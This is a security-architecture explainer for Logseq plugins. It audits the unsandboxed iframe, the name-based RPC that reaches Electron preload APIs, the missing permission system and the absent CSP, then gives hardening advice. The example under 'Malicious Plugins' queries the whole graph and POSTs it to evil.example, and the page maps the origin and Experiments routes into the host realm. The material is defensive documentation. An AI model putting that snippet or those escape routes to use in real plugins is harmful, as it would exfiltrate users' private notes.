---
title: 'Plugin Security Architecture'
status: 🟢 Stable
version: '@logseq/libs v0.3.4'
lastVerified: '2026-09-10'
verifiedAgainst: 'be800f1711'
reviewStatus: audited
quadrant: 'Explanation'
platform: '🟠 Desktop Only'
related-docs:
  - '[First Plugin Tutorial](../../tutorials/plugins/first-plugin.md)'
  - '[Plugin API Reference](../../reference/api/plugin-api.md)'
tags: ['plugin', 'security', 'iframe', 'permissions', 'rpc']
---

# Plugin Security Architecture

This document explains what Logseq's plugin runtime actually does — where plugin code executes, how it reaches the host, and what does and does not constrain it. Understanding this architecture is essential for plugin developers and security-conscious users.

> **Read this first.** Logseq does **not** sandbox plugins. The plugin `<iframe>` carries no `sandbox` attribute, plugin HTTP requests run in the Electron main process, and any plugin can reach every host-exported API by name. The app says so itself in the warning banner on the Plugins dashboard (`src/resources/dicts/en.edn:1294`): "Plugins can access your graph and your local files, issue network requests. They can also cause data corruption or loss. We're working on proper access rules for your graphs." Treat installing a plugin as running arbitrary code with your account's privileges.

**What You'll Learn:**

- Where plugin code runs and what actually separates it from the host
- The Postmate message-channel RPC between plugin and host
- The (absent) permission model, and the trust decisions that replace it
- Attack surface and the mitigations that really exist
- Security practices that help despite the above

**Prerequisites:**

- Basic understanding of plugins ([First Plugin Tutorial](../../tutorials/plugins/first-plugin.md))
- Familiarity with web security concepts

---

## Table of Contents

1. [Security Model Overview](#security-model-overview)
2. [Where Plugin Code Runs](#where-plugin-code-runs)
3. [RPC Communication](#rpc-communication)
4. [Permission System](#permission-system)
5. [Trust Boundaries](#trust-boundaries)
6. [Attack Surface](#attack-surface)
7. [Security Best Practices](#security-best-practices)

---

## Security Model Overview

### What the model actually is

The only security posture Logseq states in code is the install-time warning shown on the Plugins dashboard (`src/main/frontend/components/plugins.cljs:220-225`, rendered at `:1639` only on Electron; string at `src/resources/dicts/en.edn:1294`). It says three things, all of which the code bears out:

1. Plugins can read and write your graph and your local files.
2. Plugins can issue network requests.
3. Proper access rules do not exist yet.

Everything else below is mechanism, not protection. The separation between plugin code and host code is a **structural** one — plugin code runs in a child frame and reaches the host through one message channel — not an *enforced* one. There is no allowlist of callable methods, no per-plugin capability, no runtime consent prompt for any plugin API.

### Threats the code does address

| Threat                                          | What actually mitigates it                                                                                 |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Markup injected through `provideUI`             | The `template` string is run through DOMPurify before insertion (`libs/src/common.ts:402-412`)               |
| Arbitrary external protocol from `openExternal` | Preload allowlists `https:`, `http:`, `mailto:`, `zotero:`, `file:` (`resources/js/preload.js:9`, `:85-89`) |
| `custom.js` in a graph                          | Explicit `confirm()` consent, re-asked weekly (`src/main/frontend/handler/ui.cljs:129-164`)                  |
| A plugin found to be malicious                  | Out-of-band report to `support@logseq.com` (`src/main/frontend/handler/plugin.cljs:878-893`)                 |

### Threats the code does not address

- A plugin reading the entire graph and POSTing it anywhere. Nothing stands between `logseq.DB.datascriptQuery` and `fetch`.
- A plugin calling host-exported APIs the SDK never advertised — resolution is by name, not by registry (see [RPC Communication](#rpc-communication)).
- A plugin reaching directly into the host page's globals via `logseq.Experiments` (see [Trust Boundaries](#trust-boundaries)).
- UI spoofing. Plugin UI is injected into the host DOM by the host itself.

**Out of Scope for this document:** physical access, Electron/Chromium vulnerabilities, operating system exploits.

---

## Where Plugin Code Runs

### The Electron window

There is exactly one plugin-hosting renderer: the main window. Its `webPreferences` are set once, in `src/electron/electron/window.cljs:50-60`:

```clojure
:webPreferences
{:plugins                 true        ; pdf
 :nodeIntegration         false
 :nodeIntegrationInWorker false
 :nativeWindowOpen        true
 :sandbox                 false
 :webSecurity             (not dev?)
 :contextIsolation        true
 :enableBlinkFeatures     'OverlayScrollbars'
 :preload                 (node-path/join js/__dirname "js/preload.js")}
```

Read that carefully, because it is the answer to the question people usually ask:

- **`nodeIntegration false` and `contextIsolation true`** apply to the *whole renderer*, host and plugin frames alike. Neither is a per-plugin control, and neither is switched on or off when a plugin loads. Plugin JavaScript has no `require`, and no direct handle on the preload realm.
- **`sandbox false`** — the Chromium renderer sandbox for this window is *disabled*, so the preload script keeps full Node access.
- **`webSecurity (not dev?)`** — same-origin policy is turned **off** in development builds. In a dev build, a plugin frame can read across origins.
- Node capability reaches the renderer only through the `contextBridge` surface named `apis` (`resources/js/preload.js:36`), which includes `doAction`, `invoke(channel, args)`, `_callApplication`, `_callMainWin`, `writeFileBytes`, `openPath`, and `getFilePath`. That object lives in the **host** realm; see [RPC Communication](#rpc-communication) for how a plugin reaches it anyway.

There is **no** `<webview>` for plugins and no second `BrowserWindow` per plugin. Anything that claims per-plugin Electron settings is describing a design Logseq does not have.

### The plugin frame

A loaded plugin gets one plain `<iframe>`, created by the vendored Postmate fork. The full set of attributes it is given is at `libs/src/postmate/index.ts:402-410`:

```ts
this.frame = document.createElement('iframe')
if (opts.id) this.frame.id = opts.id
if (opts.name) this.frame.name = opts.name
if (opts.allow) this.frame.allow = opts.allow
this.frame.classList.add.apply(this.frame.classList, opts.classListArray || [])
```

**No `sandbox` attribute is ever set.** Not `allow-scripts`, not `allow-same-origin`, nothing — the attribute does not appear in the repository. Every restriction the HTML sandbox would impose (blocking popups, modals, forms, top-level navigation) is therefore **not** in effect for plugin frames.

The one attribute that could restrict anything, `allow` (Permissions Policy), is passed through from `pl.options.allow` at `libs/src/LSPlugin.caller.ts:289`. That field is declared on `PluginLocalOptions` (`libs/src/LSPlugin.core.ts:224`) but is **never assigned anywhere in the repository**, so in practice the `allow` attribute is never applied either.

The frame is built in `LSPluginCaller._setupIframeSandbox()` (`libs/src/LSPlugin.caller.ts:256-348`) — despite the method name, "sandbox" here means "the child frame", not a sandbox in the browser sense. It appends a `.lsp-iframe-sandbox-container` div to `document.body`, hands Postmate `{ container, url, model: { baseInfo }, allow, enableMessageChannel: true }`, and gives the handshake 8 seconds before destroying the frame.

Plugins declared with `mode: 'shadow'` skip the iframe entirely: `_setupShadowSandbox()` (`libs/src/LSPlugin.caller.ts:352-397`) runs the plugin in a shadow root **in the host realm**, and its `_call` dispatches straight into `pluginLocal.emit` with no message boundary at all.

### Origins, and why `effect` matters

The plugin frame's `src` is an `lsp://` URL. The scheme is registered as privileged in `src/electron/electron/core.cljs:465-476`:

```clojure
(let [privileges {:standard true :secure true :bypassCSP true
                  :corsEnabled true :supportFetchAPI true}]
  (.registerSchemesAsPrivileged protocol ...))
```

`:bypassCSP true` means content served over `lsp://` is exempt from Content Security Policy. Separately, `disableXFrameOptions` (`src/electron/electron/utils.js:9-29`, installed at `src/electron/electron/core.cljs:401`) strips `X-Frame-Options` **and `Content-Security-Policy`** from every response the window receives. There is no CSP protecting the plugin frame or the host.

Which `lsp://` host a plugin gets decides whether it is same-origin with the app. The app itself loads `lsp://logseq.com/index.html` (`src/electron/electron/window.cljs:25`). Plugin roots are (`libs/src/common.ts:22-25`):

| Constant                 | Value                           | Same origin as host? |
| ------------------------ | ------------------------------- | -------------------- |
| `URL_LSP`                | `lsp://logseq.io/plugins/`      | No                   |
| `URL_LSP_EXTERNAL`       | `lsp://logseq.io/external/`     | No                   |
| `URL_LSP_HOST`           | `lsp://logseq.com/plugins/`     | **Yes**              |
| `URL_LSP_HOST_EXTERNAL`  | `lsp://logseq.com/external/`    | **Yes**              |

The selector is the plugin's own `effect` field, copied verbatim out of its `package.json` (`libs/src/LSPlugin.core.ts:705`) and used in `getPluginLSPRoot` / `getExternalLSPRoot`:

```ts
function getPluginLSPRoot(effect?: boolean) {
  return effect ? URL_LSP_HOST : URL_LSP          // :471-473
}

function getExternalLSPRoot(localRoot: string, effect?: boolean) {
  return safetyPathJoin(
    effect === false ? URL_LSP_EXTERNAL : URL_LSP_HOST_EXTERNAL,  // :475-480
    encodeURIComponent(localRoot))
}
```

So a plugin that sets `"effect": true` places itself on `lsp://logseq.com`, **same origin as the Logseq UI**, and for plugins loaded from an external directory (the developer/"load unpacked" path) same-origin is the *default* — only an explicit `effect: false` opts out. Same origin means direct `window.top` DOM access, which is exactly what `logseq.Experiments` relies on.

One more origin note: Postmate's `resolveOrigin` returns `'*'` for `file:` URLs (`libs/src/postmate/index.ts:11-22`), and `sanitize` skips the origin check whenever the allowed origin is `'*'` (`:34-40`). Plugins whose entry resolves to `file://` therefore exchange messages with no origin check.

---

## RPC Communication

### The message channel

Communication is a fork of [Postmate](https://github.com/dollarshaveclub/postmate) vendored at `libs/src/postmate/index.ts`. Messages are tagged `application/x-postmate-v1+json` (`:3`) and validated by `sanitize()` (`:34-40`), which checks the message type, the presence of a `postmate` field, and the origin — *unless* the allowed origin is `'*'`, which is what `file:` URLs resolve to (`:11-22`).

The handshake starts as `window.postMessage`. If both sides agree (`enableMessageChannel: true`, set for every plugin frame at `libs/src/LSPlugin.caller.ts:291`), the parent creates a `MessageChannel` and transfers a port to the child (`libs/src/postmate/index.ts:451-467`); all subsequent traffic goes over the port, which carries no origin at all — so from that point the only check left is the message shape (the port branches at `:109-118` and `:264-273` skip `sanitize` deliberately).

The channel names are constants in `libs/src/LSPlugin.caller.ts:12-20`:

```ts
export const FLAG_AWAIT = '#await#response#'
export const LSPMSG = '#lspmsg#'
export const LSPMSG_ERROR_TAG = '#lspmsg#error#'
export const LSPMSG_SETTINGS = '#lspmsg#settings#'
export const LSPMSG_BEFORE_UNLOAD = '#lspmsg#beforeunload#'
export const LSPMSG_SYNC = '#lspmsg#reply#'
export const LSPMSG_READY = '#lspmsg#ready#'
```

### How an API call is resolved

Every `logseq.*` call the SDK makes becomes one `api:call` message carrying `{ tag, method, args }` (the `Proxy` built by `_makeUserProxy`, `libs/src/LSPlugin.user.ts:1002-1075`; the send is at `:1069-1073`). The host side is `initApiProxyHandlers` (`libs/src/LSPlugin.core.ts:411-422`):

```ts
pluginLocal.on('api:call', async (payload) => {
  window.$$callerPluginID = pluginLocal.id
  ret = await invokeHostExportedApi.apply(pluginLocal, [
    payload.method,
    ...payload.args,
  ])
  // ...
})
```

Note what is *not* there: no allowlist, no argument schema, no per-plugin check. The calling plugin's id is stashed on a global (`window.$$callerPluginID`) for the duration of the call, and that is the whole of the caller identity.

`invokeHostExportedApi` (`libs/src/common.ts:301-331`) then resolves the method **by name** against four objects merged in order:

```ts
const logseqHostExportedApi = Object.assign({}, window.logseq?.api, nsTarget, callables)

const fn =
  logseqHostExportedApi[method1] ||
  window.apis[method1] ||          // <- the Electron preload bridge
  logseqHostExportedApi[method] ||
  window.apis[method]

if (!fn) throw new Error(`Not existed method #${method}`)
```

The name is snake-cased first, and an `ns_` prefix matching a key of `window.logseq.sdk` selects that namespace. The practical consequence is that **`window.apis` — the `contextBridge` bridge into Electron main (`resources/js/preload.js:36`) — is in the lookup chain**. A plugin is not confined to the methods `LSPlugin.ts` declares; anything reachable by name in `window.logseq.api`, `window.logseq.sdk.*`, `libs/src/callable.apis.ts`, or `window.apis` is callable, including `doAction`, `invoke`, `_callApplication`, `_callMainWin` and `writeFileBytes`.

`LSPlugin.ts` is therefore an accurate description of the *supported* surface and a poor description of the *reachable* one. Do not read it as a security boundary.

### Network requests

`logseq.Net` / `logseq.Experiments.request` route through `exper_request` (`src/main/logseq/api.cljs:172-180`), which forwards to the Electron main process over IPC (`:httpRequest`, handled at `src/electron/electron/handler.cljs:453`). Requests therefore originate outside the renderer: **no CORS, no CSP, no origin header the renderer would have imposed.** A plugin's HTTP traffic is indistinguishable from the app's own.

---

## Permission System

### Current State (@logseq/libs v0.3.4)

**There is none.** Not "minimal" — absent. Searching `libs/src/`, `src/main/` and `src/electron/` for `permission` at `be800f1711` returns only unrelated hits: OS filesystem `EACCES` messages, the File System Access API prompt used by graph export (`src/main/frontend/utils.js:133-147`), microphone and camera prompts on mobile, and `navigator.permissions` for clipboard. No plugin manifest field, no consent dialog, no capability check, no revocation UI exists.

Every installed, enabled plugin therefore has the same access:

- **All graph data.** `logseq.Editor.*`, `logseq.DB.datascriptQuery` (`libs/src/LSPlugin.user.ts:703`) — arbitrary Datalog over the whole current graph.
- **Files under the plugin's storage root**, via `logseq.FileStorage` → `write-plugin-storage-file` / `read-plugin-storage-file` (`libs/src/modules/LSPlugin.Storage.ts:44-64`), plus asset listing through `logseq.Assets` (`src/main/logseq/sdk/assets.cljs:10-17`).
- **Arbitrary HTTP/HTTPS**, executed in the Electron main process — see [Network requests](#network-requests).
- **UI injection into the host document**, via `provideUI` / `provideStyle` (`libs/src/LSPlugin.ts:1174`, `:1194`).
- **Anything else reachable by name** through `invokeHostExportedApi`, including the `window.apis` preload bridge.

> **Corrected:** earlier revisions of this page listed "execute external commands (via shell)". No plugin-reachable shell execution exists at this revision. `logseq.Git.execCommand` is *declared* (`libs/src/LSPlugin.ts:1010-1026`, exposed at `libs/src/LSPlugin.user.ts:1135-1137`) but has **no host implementation** — no `git_exec_command` or equivalent is exported anywhere in `src/`, so the call resolves to `Not existed method #git_exec_command` and throws. See [Known Logseq defects](#known-logseq-defects).

### Trust Model

Trust is entirely install-time and entirely the user's:

```
User installs plugin → Plugin gains the full API surface, permanently
```

The only gates in the flow are structural, not permissive. `src/main/frontend/handler/plugin.cljs:1171-1172` rejects a package whose `package.json` has no `logseq` object (`Illegal logseq package`); the plugin id falls back to `logseq.id` then the package `name` (`:1173-1175`), and a package counts as a theme when `logseq.theme` or `logseq.themes` is present (`:1177`). None of that inspects what the plugin does.

What the app offers instead:

- **A warning banner** on the Plugins dashboard, Electron only (`src/main/frontend/components/plugins.cljs:220-225`, rendered at `:1639`). Open the dashboard with `t p` (`src/main/frontend/modules/shortcut/config.cljs:464`).
- **A "Report plugin" action** on each plugin's menu and on the marketplace tab (`components/plugins.cljs:281`, `:970`), which opens a dialog whose only content is a `mailto:` link to `support@logseq.com` (`handler/plugin.cljs:878-893`; copy at `src/resources/dicts/en.edn:1290`).
- **Disable and uninstall**, which is the whole of revocation.

> **Unverified:** the previous revision claimed the marketplace performs "manual review by the Logseq team". Nothing in this repository implements or documents a review process — the marketplace is a separate repository (`https://github.com/logseq/marketplace`, linked from `components/plugins.cljs:457`) and its submission policy is outside the scope of what can be verified here. The in-app copy asks users to read the source themselves, which is the only vetting this codebase assumes.

### Future Permission System

The one forward-looking statement Logseq actually makes is in the warning string itself (`src/resources/dicts/en.edn:1294`): *"We're working on proper access rules for your graphs."* No design, manifest field, or scaffolding for such a system exists at `be800f1711`. The speculative permission table that previously appeared here has been removed; it described nothing in the codebase.

---

## Trust Boundaries

### Where the boundary is, and where it leaks

```
┌─────────────────────────────────────────────────────────────┐
│  Electron main process (Node.js: fs, child_process, dugite) │
└──────────────────────────┬──────────────────────────────────┘
                           │ ipcRenderer.invoke, via contextBridge
┌──────────────────────────▼──────────────────────────────────┐
│  preload realm — resources/js/preload.js                    │
│  exposes window.apis: doAction, invoke, _callApplication,   │
│  _callMainWin, writeFileBytes, openPath, openExternal, ...  │
└──────────────────────────┬──────────────────────────────────┘
                           │ contextIsolation: true
┌──────────────────────────▼──────────────────────────────────┐
│  HOST realm — lsp://logseq.com/index.html                   │
│  Logseq core (ClojureScript), window.logseq.api / .sdk,     │
│  LSPluginCore, React — and window.apis                      │
└──────────────────────────┬──────────────────────────────────┘
                           │ Postmate: window.postMessage,
                           │ then a MessagePort. All api:call
                           │ traffic crosses here.
┌──────────────────────────▼──────────────────────────────────┐
│  PLUGIN frame — lsp://logseq.io/plugins/… (default)         │
│                 lsp://logseq.com/plugins/… when effect:true │
│  Plugin code, its npm dependencies, no sandbox attribute    │
└─────────────────────────────────────────────────────────────┘
```

Two things puncture the bottom boundary:

**1. `effect: true` collapses the origin.** As described in [Origins, and why `effect` matters](#origins-and-why-effect-matters), a plugin that sets `effect` in its `package.json` is served from `lsp://logseq.com`, the host's own origin, and externally-loaded plugins get that origin by default. Same origin means the frame can touch `window.top`'s DOM and globals directly, with no message channel involved.

**2. `logseq.Experiments` is designed to do exactly that.** `LSPluginExperiments.ensureHostScope()` returns `window.top` (`libs/src/modules/LSPlugin.Experiments.ts:274-282`), and the module reads host globals straight off it: `window.top.React` (`:50-52`), `window.top.ReactDOM` (`:54-56`), `window.top.logseq.sdk.experiments` (`:59`), `window.top.logseq.sdk.utils` (`:66`), `window.top.LSPluginCore.ensurePlugin(...)` (`:79`), and `window.top.logseq.api['exper_' + type]` (`:85-88`). `loadScripts()` (`:92-103`) asks the host to inject scripts into the host page. The module's own header says these are experimental and that plugins using them "may not be supported on the Marketplace" (`:41-45`) — it is a warning about support, not a technical restriction.

Anyone reasoning about plugin isolation should treat `Experiments` as the documented escape hatch it is: a plugin that uses it is running in the host realm.

### Data Flow Constraints

Be precise about what is and is not enforced:

| Claim                                  | Actual                                                                                                                        |
| -------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| API calls are validated                | **No.** `initApiProxyHandlers` resolves the method by name and applies the args (`libs/src/LSPlugin.core.ts:411-422`). There is no schema and no allowlist. |
| Arguments are serialized               | **Yes**, for iframe plugins — they cross a structured-clone boundary, so functions do not survive. Not true for `mode: 'shadow'` plugins, which call in-process (`libs/src/LSPlugin.caller.ts:362-378`). |
| Rate limiting                          | **Not implemented.** No throttle exists on `api:call`.                                                                          |
| Only requested data is returned        | Trivially true — each call returns its own result. It implies no restriction on what a plugin may request.                      |
| Graph data scoped to the current graph | The SDK's read paths operate on the current graph, but `logseq.App.getUserConfigs` / `getCurrentGraph` expose graph paths, and `window.apis` reaches the filesystem. Do not treat this as containment. |

---

## Attack Surface

### Known Risks

**1. Malicious Plugins**

**Risk:** Plugin intentionally exfiltrates user data. Nothing in the runtime prevents it.

```typescript
// Malicious plugin — every call here is a real, supported API
const rows = await logseq.DB.datascriptQuery(
  '[:find (pull ?b [*]) :where [?b :block/title _]]'
)
fetch('https://evil.example/steal', {
  method: 'POST',
  body: JSON.stringify(rows),
})
```

**What actually stands in the way:**

- The install-time warning banner (`src/main/frontend/components/plugins.cljs:220-225`).
- User reporting to `support@logseq.com` (`src/main/frontend/handler/plugin.cljs:878-893`).
- Reading the source yourself, which is what the in-app copy asks for.

**2. Supply Chain Attacks**

**Risk:** A compromised npm dependency inherits everything the plugin has. Because plugins are shipped as bundled JavaScript, the dependency's code runs with the plugin's full API access, and the user sees no separate signal.

**What actually stands in the way:** the plugin author's own `npm audit` / lockfile discipline. Logseq performs no dependency inspection at install time.

**3. Injection through `provideUI`**

**Risk:** A plugin renders untrusted input into a `template` string.

```typescript
// Risky plugin code
logseq.provideUI({
  key: 'my-panel',
  path: '#search',
  template: `<div>${untrustedInput}</div>`,
})
```

**Actual mitigation — and it is real:** the host sanitizes `ui.template` with DOMPurify before inserting it (`libs/src/common.ts:402-412`), allowing `iframe` plus the attributes `allow`, `src`, `allowfullscreen`, `frameborder`, `scrolling`, `target`, and permitting unknown protocols. That stops classic script injection through this path. It is not a licence to interpolate untrusted strings: `ALLOW_UNKNOWN_PROTOCOLS: true` and the `iframe`/`src` allowance leave room for navigation and embedding tricks, and nothing sanitizes `provideStyle` (`libs/src/common.ts:333-357`), which appends the string to a `<style>` in `document.head` verbatim.

**4. Reaching the host realm**

**Risk:** This is not an exploit, it is a feature. `logseq.Experiments.ensureHostScope()` returns `window.top` (`libs/src/modules/LSPlugin.Experiments.ts:274-282`); `effect: true` puts the plugin frame on the host origin so that works. A plugin that wants host-realm code execution does not need a bug.

**What actually stands in the way:** nothing technical. `Experiments`' own doc comment (`:41-45`) warns only that such plugins "may not be supported on the Marketplace".

**5. No CSP anywhere in the window**

**Risk:** The `lsp://` scheme is registered with `:bypassCSP true` (`src/electron/electron/core.cljs:465-476`), and `disableXFrameOptions` strips both `X-Frame-Options` and `Content-Security-Policy` from every response (`src/electron/electron/utils.js:9-29`, installed at `core.cljs:401`). The source comment there asks the question itself: *"Should we do this? Does this make evil sites doing danagerous things?"*

**What actually stands in the way:** nothing. Do not describe Logseq plugin frames as CSP-constrained.

**6. Development builds relax the same-origin policy**

`:webSecurity (not dev?)` (`src/electron/electron/window.cljs:55`) disables web security in dev builds. A plugin under test in a dev build has strictly more reach than the same plugin in a release build — do not use a dev build to reason about what a plugin can do.

---

## Known Logseq defects

Found while auditing this page against `be800f1711`. These are product issues, not documentation issues:

- **`logseq.Git` is dead API.** `IGitProxy` is declared (`libs/src/LSPlugin.ts:1010-1026`) and `logseq.Git` is exposed (`libs/src/LSPlugin.user.ts:1135-1137`), which routes `execCommand` to the host as `git_exec_command` (the `nstag` prefix at `libs/src/LSPlugin.user.ts:1061-1065`, snake-cased in `invokeHostExportedApi`). No such method is exported anywhere under `src/`, so the call reaches `throw new Error('Not existed method #git_exec_command')` (`libs/src/common.ts:328-330`). `IAppProxy.execGitCommand` is deprecated in favour of it (`libs/src/LSPlugin.ts:500-504`), pointing users at a method that cannot work.
- **`PluginLocalOptions.allow` is declared but never assigned** (`libs/src/LSPlugin.core.ts:224`, consumed at `libs/src/LSPlugin.caller.ts:289`), so the only per-frame restriction the loader can express is permanently unset.
- **The `effect` flag is attacker-controlled.** It is copied out of the plugin's own `package.json` (`libs/src/LSPlugin.core.ts:705`) and decides whether the plugin frame is same-origin with the app (`:471-480`). A plugin chooses its own origin.

---

## Security Best Practices

### For Plugin Developers

**1. Minimize Data Access**

```typescript
// ❌ Bad: pull the whole page just to reach one block
const tree = await logseq.Editor.getPageBlocksTree(pageName)
const targetBlock = tree.find((b) => b.uuid === uuid)

// ✅ Good: fetch only what you need
const targetBlock = await logseq.Editor.getBlock(uuid)
```

`getBlock` takes a `BlockIdentity | EntityID` — a UUID string or an entity id — not an options
object (`libs/src/LSPlugin.ts:807-810`). There is no `getAllBlocks`; the bulk read paths are
`getPageBlocksTree` (`:734`), `getCurrentPageBlocksTree` (`:727`), `getAllPages` (`:848`) and
`logseq.DB.datascriptQuery` (`:971`).

**2. Sanitize User Input**

```typescript
// ❌ Bad: interpolate untrusted input into a template
logseq.provideUI({ key: 'panel', path: '#search', template: `<div>${userInput}</div>` })

// ✅ Better: escape or sanitize before you hand it over
import DOMPurify from 'dompurify'
const safe = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: [] })
logseq.provideUI({ key: 'panel', path: '#search', template: `<div>${safe}</div>` })
```

The host does run `ui.template` through DOMPurify (`libs/src/common.ts:402-412`), but with
`ADD_TAGS: ['iframe']`, `ALLOW_UNKNOWN_PROTOCOLS: true` and `src`/`allow`/`target` permitted —
a wider policy than most plugins want. Sanitize on your side with a policy you chose. Note also
that `provideStyle` is **not** sanitized (`libs/src/common.ts:333-357`): never build a stylesheet
string out of untrusted input.

**3. Validate External Data**

```typescript
// ❌ Bad: Trust API response directly
const data = await fetch('https://api.example.com/data')
const json = await data.json()
await logseq.Editor.insertBlock(targetUuid, json.content)

// ✅ Good: Validate structure and types
const schema = z.object({
  content: z.string().max(10000),
})
const validated = schema.parse(json)
await logseq.Editor.insertBlock(targetUuid, validated.content)
```

`insertBlock(srcBlock, content, opts?)` takes the target block first and the content as a plain
string — content is not an option key (`libs/src/LSPlugin.ts:775-786`).

**4. Secure API Keys**

```typescript
// ❌ Bad: Hardcode API keys
const API_KEY = 'sk-1234567890abcdef'

// ✅ Good: Store in plugin settings (user-configured)
const apiKey = logseq.settings?.apiKey
if (!apiKey) {
  throw new Error('Please configure API key in plugin settings')
}
```

**5. Audit Dependencies**

```bash
# Check for vulnerabilities
npm audit

# Update dependencies
npm audit fix

# Review dependency tree
npm ls --all
```

### For Users

**1. Install plugins you are willing to run unsandboxed**

The app's own advice (`src/resources/dicts/en.edn:1294`) is to "only install the plugins when you
can read and understand the source code", and to keep regular backups because a plugin can corrupt
or destroy graph data. That advice is not conservatism — it follows directly from the fact that no
technical control limits a plugin once installed.

- Prefer plugins whose source you can read.
- Treat a plugin's npm dependencies as part of what you are installing.
- Be aware that `"effect": true` in a plugin's `package.json` puts it on the app's own origin.

**2. Disable and uninstall is the whole of revocation**

There is no permission review UI, because there are no permissions. Open the Plugins dashboard with
`t p` (`src/main/frontend/modules/shortcut/config.cljs:464`) and remove what you no longer use —
the app prompts about this itself once enough plugins accumulate disabled
(`src/main/frontend/components/plugins.cljs:792-814`).

**3. Keep Logseq Updated**

- Security patches in core
- Electron security updates
- Plugin SDK improvements

**4. Report Suspicious Behavior**

- Unexpected network requests
- Performance degradation
- Data corruption
- UI spoofing

---

## Comparison: Logseq vs Other Platforms

> **Unverified:** the rows below for VS Code, Obsidian, Notion and browser extensions describe
> third-party products and cannot be checked against this repository. They are left in as context
> only; do not cite them. The Logseq row is verified.

| Platform               | Isolation                                             | Permissions        | Trust Model  |
| ---------------------- | ----------------------------------------------------- | ------------------ | ------------ |
| **Logseq**             | Child iframe, **no `sandbox` attribute**; same origin as the app when `effect: true` | None — full access | Install-time |
| *VS Code*              | *Extension host subprocess*                           | *Granular*         | *Varies*     |
| *Obsidian*             | *In-process*                                          | *None*             | *Install-time* |
| *Notion*               | *Server-side integrations*                            | *OAuth scopes*     | *OAuth consent* |
| *Browser extensions*   | *Isolated worlds*                                     | *Declarative manifest* | *Install-time* |

**What is distinctive about Logseq:**

- **Local-first.** No server sees the plugin or the data, so no server-side validation exists.
- **Full API access by construction.** `invokeHostExportedApi` resolves methods by name across the host API, the SDK namespaces and the Electron preload bridge (`libs/src/common.ts:301-331`).
- **Origin is the plugin's own choice**, via the `effect` field in its `package.json`.

---

## Future Improvements

The only commitment made anywhere in the codebase is the sentence in the install-time warning
(`src/resources/dicts/en.edn:1294`):

> "We're working on proper access rules for your graphs."

Nothing more specific — no manifest permission field, no consent flow, no rate limiter, no CSP —
exists or is scaffolded at `be800f1711`. The roadmap that previously appeared in this section has
been removed because none of it was traceable to source; re-add items here only with a commit or
issue to point at.

---

## Next Steps

**Continue Learning:**

1. **[First Plugin Tutorial](../../tutorials/plugins/first-plugin.md)** - Build secure plugins
2. **[Plugin API Reference](../../reference/api/plugin-api.md)** - Available API methods
3. **Source of record** - [`libs/src/LSPlugin.ts`](../../../../../libs/src/LSPlugin.ts) for the type surface, [`libs/src/LSPlugin.core.ts`](../../../../../libs/src/LSPlugin.core.ts) for the loader, [`src/electron/electron/window.cljs`](../../../../../src/electron/electron/window.cljs) for the Electron settings

**Reporting a problem with a plugin:**

Use the in-app **Report plugin** action (`src/main/frontend/components/plugins.cljs:281`), which
opens a `mailto:` to `support@logseq.com` (`src/main/frontend/handler/plugin.cljs:891`). The in-app
copy asks for the plugin name and its GitHub repository URL and states that the team usually
responds within a business day (`src/resources/dicts/en.edn:1290`).

> **Unverified:** this repository contains no security.txt, responsible-disclosure policy, bug
> bounty programme, or `security@logseq.com` address. A previous revision of this page listed
> `security@logseq.com`; that address appears nowhere in the codebase and has been removed.

---

**Questions or Feedback?** Join the [Logseq Discord](https://discord.gg/KpN4eHY) or visit [discuss.logseq.com](https://discuss.logseq.com).
